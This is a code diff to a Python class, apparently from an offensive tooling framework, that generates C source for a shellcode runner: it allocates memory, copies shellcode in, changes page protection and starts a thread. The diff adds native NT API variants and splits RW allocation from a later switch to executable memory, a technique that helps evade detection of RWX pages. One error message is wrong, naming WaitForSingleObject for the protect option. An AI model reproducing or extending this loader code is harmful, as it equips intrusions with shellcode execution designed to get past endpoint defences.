@@ -3,21 +3,22 @@ from string import Template
 class shellcoderunner:
     def __init__(self, arguments):
         self.apicallsList = ['CloseHandle']
+
+        self.memoryPermission = 'PAGE_EXECUTE_READ'
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
+
         self.allocation = 'VirtualAlloc'
-        self.execution = 'CreateThread'
-        self.copy = 'memcpy'
-        self.wait = 'WaitForSingleObject'
         if 'allocation' in arguments:
-            self.allocation = arguments['allocation']
-        if 'execution' in arguments:
-            self.execution = arguments['execution']
-        if 'copy' in arguments:
-            self.copy = arguments['copy']
-        if 'wait' in arguments:
-            self.wait = arguments['wait']
+            if arguments['allocation'] in ['VirtualAlloc', 'HeapAlloc', 'NtAllocateVirtualMemory']:
+                self.allocation = arguments['allocation']
+            else:
+                print('Allocation argument must be VirtualAlloc, HeapAlloc, or NtAllocateVirtualMemory')
+                exit(0)
         if self.allocation == 'VirtualAlloc':
             self.allocationCode = """
-    LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 """
             self.freeCode = """
     {VirtualFree}(buffer, 0, MEM_RELEASE);
@@ -25,7 +26,7 @@ class shellcoderunner:
             self.apicallsList += ['VirtualAlloc', 'VirtualFree']
         elif self.allocation == 'HeapAlloc':
             self.allocationCode = """
-    HANDLE hHeap = {HeapCreate}(HEAP_CREATE_ENABLE_EXECUTE, {shellcodeSize}, 0);
+    HANDLE hHeap = {HeapCreate}(0, {shellcodeSize}, 0);
     LPVOID buffer = {HeapAlloc}(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});
 """
             self.freeCode = """
@@ -36,12 +37,20 @@ class shellcoderunner:
             self.allocationCode = """
     PVOID buffer = NULL;
     SIZE_T allocationSize = {shellcodeSize};
-    {NtAllocateVirtualMemory}((HANDLE)-1, &buffer, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    {NtAllocateVirtualMemory}((HANDLE)-1, &buffer, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 """
             self.freeCode = """
-    {VirtualFree}(buffer, 0, MEM_RELEASE);
+    {NtFreeVirtualMemory}((HANDLE)-1, &buffer, 0, MEM_RELEASE);
 """
-            self.apicallsList += ['NtAllocateVirtualMemory', 'VirtualFree']
+            self.apicallsList += ['NtAllocateVirtualMemory', 'NtFreeVirtualMemory']
+
+        self.execution = 'CreateThread'
+        if 'execution' in arguments:
+            if arguments['execution'] in ['CreateThread', 'NtCreateThreadEx']:
+                self.execution = arguments['execution']
+            else:
+                print('Execution argument must be CreateThread or NtCreateThreadEx')
+                exit(0)
         if self.execution == 'CreateThread':
             self.executionCode = """
     HANDLE hThread = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
@@ -53,6 +62,14 @@ class shellcoderunner:
     {NtCreateThreadEx}(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, NULL);
 """
             self.apicallsList += ['NtCreateThreadEx']
+
+        self.copy = 'memcpy'
+        if 'copy' in arguments:
+            if arguments['copy'] in ['memcpy', 'NtWriteVirtualMemory']:
+                self.copy = arguments['copy']
+            else:
+                print('Copy argument must be memcpy or NtWriteVirtualMemory')
+                exit(0)
         if self.copy == 'memcpy':
             self.copyCode = """
     memcpy(buffer, shellcode, {shellcodeSize});
@@ -63,6 +80,35 @@ class shellcoderunner:
     {NtWriteVirtualMemory}((HANDLE)-1, buffer, shellcode, {shellcodeSize}, &bytesWritten);
 """
             self.apicallsList += ['NtWriteVirtualMemory']
+
+        self.protect = 'VirtualProtect'
+        if 'protect' in arguments:
+            if arguments['protect'] in ['VirtualProtect', 'NtProtectVirtualMemory']:
+                self.protect = arguments['protect']
+            else:
+                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
+                exit(0)
+        if self.protect == 'VirtualProtect':
+            self.protectCode = Template("""
+    DWORD oldProtect;
+    {VirtualProtect}(buffer, {shellcodeSize}, $memoryPermission, &oldProtect);
+""").substitute(memoryPermission=self.memoryPermission)
+            self.apicallsList += ['VirtualProtect']
+        elif self.protect == 'NtProtectVirtualMemory':
+            self.protectCode = Template("""
+    SIZE_T size = {shellcodeSize};
+    ULONG OldProtect; 
+    {NtProtectVirtualMemory}((HANDLE)-1, &buffer, &size, $memoryPermission, &OldProtect);
+""").substitute(memoryPermission=self.memoryPermission)
+            self.apicallsList += ['NtProtectVirtualMemory']
+
+        self.wait = 'WaitForSingleObject'
+        if 'wait' in arguments:
+            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject']:
+                self.wait = arguments['wait']
+            else:
+                print('Wait argument must be WaitForSingleObject or NtWaitForSingleObject')
+                exit(0)
         if self.wait == 'WaitForSingleObject':
             self.waitCode = """
     {WaitForSingleObject}(hThread, INFINITE);
@@ -80,7 +126,8 @@ class shellcoderunner:
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
                 "#include <stdio.h>", 
-                "#include <stdlib.h>"]
+                "#include <stdlib.h>",
+                '#include "spawnandinject.h"']
 
     def compilerOptions(self) -> list[str]:
         return []
@@ -100,6 +147,8 @@ class shellcoderunner:
     // Copy our shellcode into memory that we just allocated (inside of our current process)
     $copy
 
+    $protect
+    
     // Create thread to run shellcode
     $execution
 
@@ -109,4 +158,4 @@ class shellcoderunner:
 
     // Clean up by freeing the memory we allocated for our shellcode
     $free
-""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, copy=self.copyCode, wait=self.waitCode)
+""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, protect=self.protectCode, copy=self.copyCode, wait=self.waitCode)
